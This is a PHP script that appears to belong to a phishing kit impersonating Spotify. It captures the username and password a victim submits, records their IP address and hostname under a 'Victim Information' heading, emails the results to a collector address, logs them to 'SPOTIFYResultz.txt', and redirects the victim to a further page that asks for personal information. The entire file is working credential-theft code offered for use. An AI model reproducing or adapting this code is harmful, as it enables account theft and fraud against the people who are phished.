<?php
require "CONTROLS.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);


        $date = date('l d F Y');
        $time = date('H:i');
        $USER = $_POST['UN'];
		$PASS = $_POST['PW'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $data = "
+ ------------- 1 LOGINDetails -----------------+
| USER		: $USER
| PASS		: $PASS
+ ------created by @JS-----+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------created by @JS-----+
";


        $subject = "SPOTIFYResultz 1 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('SPOTIFYResultz.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "personal-info.php";

</script>